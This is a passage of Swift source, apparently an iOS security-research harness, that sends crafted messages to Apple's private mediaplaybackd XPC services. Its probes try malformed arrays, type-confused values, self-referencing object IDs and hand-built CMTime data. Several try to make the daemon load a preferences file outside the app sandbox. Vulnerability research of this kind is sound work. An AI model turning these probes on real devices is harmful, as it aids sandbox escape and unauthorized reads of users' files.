                    if let m = xq_dictionary_create(nil, nil, 0) {
                        ".Operation".withCString { xq_dictionary_set_uint64(m, $0, UInt64(fourcc)) }
                        ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                        ".objectID".withCString { xq_dictionary_set_uint64(m, $0, oid) }
                        if let r = sendSync(c, m, timeout: 5.0) {
                            let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                            emit("x6:   \(op.trimmingCharacters(in: .whitespaces)) = \(e)")
                            xq_release(r)
                        }
                        xq_release(m)
                    }
                    Thread.sleep(forTimeInterval: 0.3)
                }
            }
            xq_cancel(c); xq_release(c)
        }
        emit("x6: done")
    }

    func insertSegmentProbe() {
        emit("xis: insert segment")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4") else {
            emit("xis: sample missing"); return
        }
        guard let c = "com.apple.coremedia.mediaplaybackd.mutablecomposition.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xis: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xis: SERVER EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xis: no token"); xq_release(c); return }

        var compID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            if let r = sendSync(c, m, timeout: 5.0) {
                compID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        emit("xis: composition=\(compID)")
        guard compID != 0 else { xq_release(c); return }

        // addt may hand back a track id; log the whole reply.
        var trackID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x61646474) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            if let r = sendSync(c, m, timeout: 5.0) {
                emit("xis: addt reply = \(describe(r))")
                for key in [".objectID", "TrackID", "DestTrackID", ".trackID"] {
                    let v = key.withCString { xq_dictionary_get_uint64(r, $0) }
                    if v != 0 && v != compID { trackID = v; emit("xis: track from \(key)=\(v)"); break }
                }
                xq_release(r)
            }
            xq_release(m)
        }

        // Send the segment arrays, varying how many URLs versus tracks we claim.
        for (label, urlCount, trackCount, useOutside) in [
            ("one-and-one", 1, 1, false),
            ("two-urls-one-track", 2, 1, false),
            ("one-url-zero-tracks", 1, 0, false),
            ("outside-url", 1, 1, true),
        ] as [(String, Int, Int, Bool)] {
            guard let m = xq_dictionary_create(nil, nil, 0),
                  let urls = xq_array_create(nil, 0),
                  let ids = xq_array_create(nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x696e7374) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            "DestTrackID".withCString { xq_dictionary_set_uint64(m, $0, trackID) }

            let urlString = useOutside
                ? "file:///private/var/mobile/Library/Preferences/com.apple.mobiletimer.plist"
                : mp4.absoluteString
            for _ in 0..<urlCount {
                if let d = xq_dictionary_create(nil, nil, 0) {
                    "URL".withCString { k in
                        urlString.withCString { v in xq_dictionary_set_string(d, k, v) }
                    }
                    if let t = xq_data_create(nil, 0) {
                        "Token".withCString { xq_dictionary_set_value(d, $0, t) }
                        xq_release(t)
                    }
                    xq_array_append_value(urls, d)
                    xq_release(d)
                }
            }
            for _ in 0..<trackCount { xq_array_append_int64(ids, 0) }

            "EditsAssetURLsAndTokens".withCString { xq_dictionary_set_value(m, $0, urls) }
            "EditsAssetTrackIDs".withCString { xq_dictionary_set_value(m, $0, ids) }
            if let r = sendSync(c, m, timeout: 6.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xis: inst[\(label)] err=\(e)")
                emit("xis:   \(describe(r))")
                xq_release(r)
            } else {
                emit("xis: inst[\(label)] no reply")
            }
            xq_release(urls); xq_release(ids); xq_release(m)
            Thread.sleep(forTimeInterval: 0.6)
        }
        xq_cancel(c); xq_release(c)
        emit("xis: done")
    }

    func insertFullProbe() {
        emit("xif: insert with all six fields")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4") else {
            emit("xif: sample missing"); return
        }
        guard let c = "com.apple.coremedia.mediaplaybackd.mutablecomposition.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xif: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xif: SERVER EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xif: no token"); xq_release(c); return }

        var compID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            if let r = sendSync(c, m, timeout: 5.0) {
                compID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        guard compID != 0 else { emit("xif: no composition"); xq_release(c); return }

        var trackID: UInt64 = 1
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x61646474) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            if let r = sendSync(c, m, timeout: 5.0) {
                let t = "TrackID".withCString { xq_dictionary_get_uint64(r, $0) }
                if t != 0 { trackID = t }
                xq_release(r)
            }
            xq_release(m)
        }
        emit("xif: track=\(trackID)")

        let urlText = mp4.absoluteString
        for (label, url2) in [("one", urlText),
                              ("outside", "file:///private/var/mobile/Library/Preferences/com.apple.mobiletimer.plist")] {
            guard let m = xq_dictionary_create(nil, nil, 0),
                  let starts = xq_array_create(nil, 0),
                  let durs = xq_array_create(nil, 0),
                  let ids = xq_array_create(nil, 0),
                  let urls = xq_array_create(nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x696e7374) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            "DestTrackID".withCString { xq_dictionary_set_uint64(m, $0, trackID) }
            xq_array_append_int64(starts, 0)
            xq_array_append_int64(durs, 1000)
            xq_array_append_int64(ids, 1)   // source track is the one addt created
            url2.withCString { v in
                if let s = xq_string_create(v) {
                    xq_array_append_value(urls, s)
                    xq_release(s)
                }
            }
            "EditsSourceStarts".withCString { xq_dictionary_set_value(m, $0, starts) }
            "EditsSourceDurations".withCString { xq_dictionary_set_value(m, $0, durs) }
            "EditsAssetTrackIDs".withCString { xq_dictionary_set_value(m, $0, ids) }
            "EditsAssetURLsAndTokens".withCString { xq_dictionary_set_value(m, $0, urls) }
            if let r = sendSync(c, m, timeout: 8.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xif: inst[\(label)] err=\(e)")
                emit("xif:   \(describe(r))")
                xq_release(r)
            } else {
                emit("xif: inst[\(label)] no reply")
            }
            xq_release(starts); xq_release(durs); xq_release(ids); xq_release(urls); xq_release(m)
            Thread.sleep(forTimeInterval: 0.8)
        }
        xq_cancel(c); xq_release(c)
        emit("xif: done")
    }

    func insertTypedProbe() {
        emit("xit: typed url elements")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4") else {
            emit("xit: sample missing"); return
        }
        guard let c = "com.apple.coremedia.mediaplaybackd.mutablecomposition.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xit: connect failed"); return
        }
        xq_set_event_handler(c) { _ in }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xit: no token"); xq_release(c); return }

        var compID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            if let r = sendSync(c, m, timeout: 5.0) {
                compID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        guard compID != 0 else { xq_release(c); return }
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x61646474) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            if let r = sendSync(c, m, timeout: 5.0) { xq_release(r) }
            xq_release(m)
        }

        let urlText = mp4.absoluteString
        let variants: [(String, (XObj) -> Void)] = [
            ("cfnull", { arr in
                if let n = xq_null_create() { xq_array_append_value(arr, n); xq_release(n) }
            }),
            ("dict-url", { arr in
                if let d = xq_dictionary_create(nil, nil, 0) {
                    "URL".withCString { k in
                        urlText.withCString { v in xq_dictionary_set_string(d, k, v) }
                    }
                    xq_array_append_value(arr, d); xq_release(d)
                }
            }),
            ("dict-type-value", { arr in
                if let d = xq_dictionary_create(nil, nil, 0) {
                    "Type".withCString { k in
                        "URL".withCString { v in xq_dictionary_set_string(d, k, v) }
                    }
                    "Value".withCString { k in
                        urlText.withCString { v in xq_dictionary_set_string(d, k, v) }
                    }
                    xq_array_append_value(arr, d); xq_release(d)
                }
            }),
            ("number", { arr in
                if let n = xq_int64_make(0) { xq_array_append_value(arr, n); xq_release(n) }
            }),
        ]

        for (label, build) in variants {
            guard let m = xq_dictionary_create(nil, nil, 0),
                  let starts = xq_array_create(nil, 0),
                  let durs = xq_array_create(nil, 0),
                  let ids = xq_array_create(nil, 0),
                  let urls = xq_array_create(nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x696e7374) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            "DestTrackID".withCString { xq_dictionary_set_uint64(m, $0, 1) }
            xq_array_append_int64(starts, 0)
            xq_array_append_int64(durs, 1000)
            xq_array_append_int64(ids, 0)
            build(urls)
            "EditsSourceStarts".withCString { xq_dictionary_set_value(m, $0, starts) }
            "EditsSourceDurations".withCString { xq_dictionary_set_value(m, $0, durs) }
            "EditsAssetTrackIDs".withCString { xq_dictionary_set_value(m, $0, ids) }
            "EditsAssetURLsAndTokens".withCString { xq_dictionary_set_value(m, $0, urls) }
            if let r = sendSync(c, m, timeout: 6.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xit: \(label) err=\(e)")
                xq_release(r)
            } else {
                emit("xit: \(label) no reply")
            }
            xq_release(starts); xq_release(durs); xq_release(ids); xq_release(urls); xq_release(m)
            Thread.sleep(forTimeInterval: 0.6)
        }
        xq_cancel(c); xq_release(c)
        emit("xit: done")
    }

    func insertPlistProbe() {
        emit("xip: insert with plist-encoded arrays")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4") else {
            emit("xip: sample missing"); return
        }
        func putPlist(_ m: XObj, _ key: String, _ value: Any) -> Bool {
            guard let data = try? PropertyListSerialization.data(fromPropertyList: value,
                                                                  format: .binary, options: 0) else {
                return false
            }
            data.withUnsafeBytes { raw in
                if let d = xq_data_create(raw.baseAddress, raw.count) {
                    key.withCString { xq_dictionary_set_value(m, $0, d) }
                    xq_release(d)
                }
            }
            return true
        }

        guard let c = "com.apple.coremedia.mediaplaybackd.mutablecomposition.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xip: connect failed"); return
        }
        xq_set_event_handler(c) { _ in }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xip: no token"); xq_release(c); return }

        var compID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            if let r = sendSync(c, m, timeout: 5.0) {
                compID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        guard compID != 0 else { xq_release(c); return }
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x61646474) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            if let r = sendSync(c, m, timeout: 5.0) { xq_release(r) }
            xq_release(m)
        }
        emit("xip: composition=\(compID)")

        for (label, url) in [("own", mp4),
                             ("outside", URL(fileURLWithPath: "/private/var/mobile/Library/Preferences/com.apple.mobiletimer.plist"))] {
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x696e7374) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            "DestTrackID".withCString { xq_dictionary_set_uint64(m, $0, 1) }

            _ = putPlist(m, "EditsSourceStarts", [0])
            _ = putPlist(m, "EditsSourceDurations", [1000])
            _ = putPlist(m, "EditsAssetTrackIDs", [0])
            let ok = putPlist(m, "EditsAssetURLsAndTokens", [url])
            emit("xip: [\(label)] plist written=\(ok)")

            if let r = sendSync(c, m, timeout: 8.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xip: [\(label)] err=\(e)")
                emit("xip:   \(describe(r))")
                xq_release(r)
            } else {
                emit("xip: [\(label)] no reply")
            }
            xq_release(m)
            Thread.sleep(forTimeInterval: 0.8)
        }
        xq_cancel(c); xq_release(c)
        emit("xip: done")
    }

    func urlEncodingProbe() {
        emit("xue: url element encoding")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4") else {
            emit("xue: sample missing"); return
        }
        guard let c = "com.apple.coremedia.mediaplaybackd.mutablecomposition.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xue: connect failed"); return
        }
        xq_set_event_handler(c) { _ in }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xue: no token"); xq_release(c); return }

        var compID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            if let r = sendSync(c, m, timeout: 5.0) {
                compID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        guard compID != 0 else { xq_release(c); return }
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x61646474) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            if let r = sendSync(c, m, timeout: 5.0) { xq_release(r) }
            xq_release(m)
        }

        let urlText = mp4.absoluteString
        let variants: [(String, (XObj) -> Void)] = [
            ("CFURLString", { d in
                "CFURLString".withCString { k in
                    urlText.withCString { v in xq_dictionary_set_string(d, k, v) }
                }
            }),
            ("CFURLString+Type", { d in
                "CFURLString".withCString { k in
                    urlText.withCString { v in xq_dictionary_set_string(d, k, v) }
                }
                "CFURLStringType".withCString { xq_dictionary_set_int64(d, $0, 0) }
            }),
            ("_CFURLString", { d in
                "_CFURLString".withCString { k in
                    urlText.withCString { v in xq_dictionary_set_string(d, k, v) }
                }
                "_CFURLStringType".withCString { xq_dictionary_set_int64(d, $0, 0) }
            }),
        ]

        for (label, fill) in variants {
            guard let m = xq_dictionary_create(nil, nil, 0),
                  let starts = xq_array_create(nil, 0),
                  let durs = xq_array_create(nil, 0),
                  let ids = xq_array_create(nil, 0),
                  let urls = xq_array_create(nil, 0),
                  let elem = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x696e7374) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            "DestTrackID".withCString { xq_dictionary_set_uint64(m, $0, 1) }
            xq_array_append_int64(starts, 0)
            xq_array_append_int64(durs, 1000)
            xq_array_append_int64(ids, 0)
            fill(elem)
            xq_array_append_value(urls, elem)
            "EditsSourceStarts".withCString { xq_dictionary_set_value(m, $0, starts) }
            "EditsSourceDurations".withCString { xq_dictionary_set_value(m, $0, durs) }
            "EditsAssetTrackIDs".withCString { xq_dictionary_set_value(m, $0, ids) }
            "EditsAssetURLsAndTokens".withCString { xq_dictionary_set_value(m, $0, urls) }
            if let r = sendSync(c, m, timeout: 6.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xue: \(label) err=\(e)")
                xq_release(r)
            } else {
                emit("xue: \(label) no reply")
            }
            xq_release(starts); xq_release(durs); xq_release(ids); xq_release(urls)
            xq_release(elem); xq_release(m)
            Thread.sleep(forTimeInterval: 0.6)
        }
        xq_cancel(c); xq_release(c)
        emit("xue: done")
    }

    func compositionRefProbe() {
        emit("xcr: composition reference as edit source")
        guard let c = "com.apple.coremedia.mediaplaybackd.mutablecomposition.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xcr: connect failed"); return
        }
        xq_set_event_handler(c) { _ in }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xcr: no token"); xq_release(c); return }

        var compID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            if let r = sendSync(c, m, timeout: 5.0) {
                compID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        guard compID != 0 else { xq_release(c); return }
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x61646474) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            if let r = sendSync(c, m, timeout: 5.0) { xq_release(r) }
            xq_release(m)
        }
        emit("xcr: composition=\(compID)")

        for (label, refValue) in [("self", Int64(bitPattern: compID)),
                                  ("zero", Int64(0)),
                                  ("minus-one", Int64(-1))] {
            guard let m = xq_dictionary_create(nil, nil, 0),
                  let starts = xq_array_create(nil, 0),
                  let durs = xq_array_create(nil, 0),
                  let ids = xq_array_create(nil, 0),
                  let urls = xq_array_create(nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x696e7374) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            "DestTrackID".withCString { xq_dictionary_set_uint64(m, $0, 1) }
            xq_array_append_int64(starts, 0)
            xq_array_append_int64(durs, 1000)
            xq_array_append_int64(ids, 0)
            xq_array_append_int64(urls, refValue)
            "EditsSourceStarts".withCString { xq_dictionary_set_value(m, $0, starts) }
            "EditsSourceDurations".withCString { xq_dictionary_set_value(m, $0, durs) }
            "EditsAssetTrackIDs".withCString { xq_dictionary_set_value(m, $0, ids) }
            "EditsAssetURLsAndTokens".withCString { xq_dictionary_set_value(m, $0, urls) }
            if let r = sendSync(c, m, timeout: 6.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xcr: inst[\(label)] err=\(e)")
                emit("xcr:   \(describe(r))")
                xq_release(r)
            } else {
                emit("xcr: inst[\(label)] no reply")
            }
            xq_release(starts); xq_release(durs); xq_release(ids); xq_release(urls); xq_release(m)
            Thread.sleep(forTimeInterval: 0.6)
        }
        xq_cancel(c); xq_release(c)
        emit("xcr: done")
    }

    func cmTimeProbe() {
        emit("xct: CMTime arrays")
        func timeData(_ value: Int64, _ timescale: Int32, _ flags: Int32) -> XObj? {
            var bytes = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in
                for (i, b) in raw.enumerated() { bytes[i] = b }
            }
            withUnsafeBytes(of: timescale.littleEndian) { raw in
                for (i, b) in raw.enumerated() { bytes[8 + i] = b }
            }
            withUnsafeBytes(of: flags.littleEndian) { raw in
                for (i, b) in raw.enumerated() { bytes[12 + i] = b }
            }
            return bytes.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        guard let c = "com.apple.coremedia.mediaplaybackd.mutablecomposition.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xct: connect failed"); return
        }
        xq_set_event_handler(c) { _ in }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xct: no token"); xq_release(c); return }

        var compID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            if let r = sendSync(c, m, timeout: 5.0) {
                compID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        guard compID != 0 else { xq_release(c); return }
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x61646474) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
            if let r = sendSync(c, m, timeout: 5.0) { xq_release(r) }
            xq_release(m)
        }
        emit("xct: composition=\(compID)")

        guard let m = xq_dictionary_create(nil, nil, 0),
              let starts = xq_array_create(nil, 0),
              let durs = xq_array_create(nil, 0),
              let ids = xq_array_create(nil, 0),
              let urls = xq_array_create(nil, 0) else { xq_release(c); return }
        ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x696e7374) }
        ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
        ".objectID".withCString { xq_dictionary_set_uint64(m, $0, compID) }
        "DestTrackID".withCString { xq_dictionary_set_uint64(m, $0, 1) }
        // DestStart is read by the handler but is not part of its null check;
        // leaving it out still fails later, so send it as a CMTime too.
        if let ds = timeData(0, 1000, 1) {
            "DestStart".withCString { xq_dictionary_set_value(m, $0, ds) }
            xq_release(ds)
        }
        if let s = timeData(0, 1000, 1) { xq_array_append_value(starts, s); xq_release(s) }
        if let d = timeData(1000, 1000, 1) { xq_array_append_value(durs, d); xq_release(d) }
        xq_array_append_int64(ids, 0)
        xq_array_append_int64(urls, Int64(bitPattern: compID))
        "EditsSourceStarts".withCString { xq_dictionary_set_value(m, $0, starts) }
        "EditsSourceDurations".withCString { xq_dictionary_set_value(m, $0, durs) }
        "EditsAssetTrackIDs".withCString { xq_dictionary_set_value(m, $0, ids) }
        "EditsAssetURLsAndTokens".withCString { xq_dictionary_set_value(m, $0, urls) }
        if let r = sendSync(c, m, timeout: 8.0) {
            let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
            emit("xct: inst err=\(e)")
            emit("xct:   \(describe(r))")
            xq_release(r)
        } else {
            emit("xct: inst no reply")
        }
        xq_release(starts); xq_release(durs); xq_release(ids); xq_release(urls); xq_release(m)
        xq_cancel(c); xq_release(c)
        emit("xct: done")
    }

    func assetCreateProbe() {
        emit("xac: cr8U create asset from URL")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4") else {
            emit("xac: sample missing"); return
        }
        let urlText = mp4.absoluteString
        emit("xac: url=\(urlText)")

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xac: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xac: SERVER EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        emit("xac: token=\(tok)")
        guard tok != 0 else { xq_release(c); return }

        var assetID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63723855) }   // cr8U
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            // The server reads .SourceURL with FigXPCMessageCopyCFURL, which
            // requires a real CFURL. Encode it with the framework's own setter
            // so the wire format matches what stock clients produce.
            ".SourceURL".withCString { k in
                _ = fig_message_set_cfurl(m, k, mp4 as CFURL)
            }
            // A real, empty XPC dictionary: the handler branches on its
            // presence and passes it to FigCFDictionaryCreateMutableCopy.
            // Diagnostic: the wrong type distinguishes "key not found"
            // (still -12170) from "value rejected" (a type error).
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if let r = sendSync(c, m, timeout: 10.0) {
                let hasErr = ".ErrorReturn".withCString { xq_dictionary_get_value(r, $0) } != nil
                let err = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                assetID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                emit("xac: cr8U -> \(hasErr ? "err=\(err)" : "no ErrorReturn") id=\(assetID)")
                emit("xac:   \(describe(r))")
                xq_release(r)
            } else {
                emit("xac: cr8U no reply")
            }
            xq_release(m)
        }

        // Only a usable object proves creation; a non-zero id alone does not.
        if assetID != 0 {
            // doom is the cleanest reachability test: it needs only .objectID.
            // A real object answers 0, a bogus id answers -16152.
            for (label, oid) in [("real", assetID), ("bogus", assetID &+ 1)] {
                if let m = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x646f6f6d) }
                    ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(m, $0, oid) }
                    if let r = sendSync(c, m, timeout: 6.0) {
                        let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xac: doom[\(label)] err=\(e)")
                        xq_release(r)
                    }
                    xq_release(m)
                }
                Thread.sleep(forTimeInterval: 0.4)
            }
            // stat takes PropertyNames; an empty list still proves the
            // object is reachable, and a real name exercises the lookup.
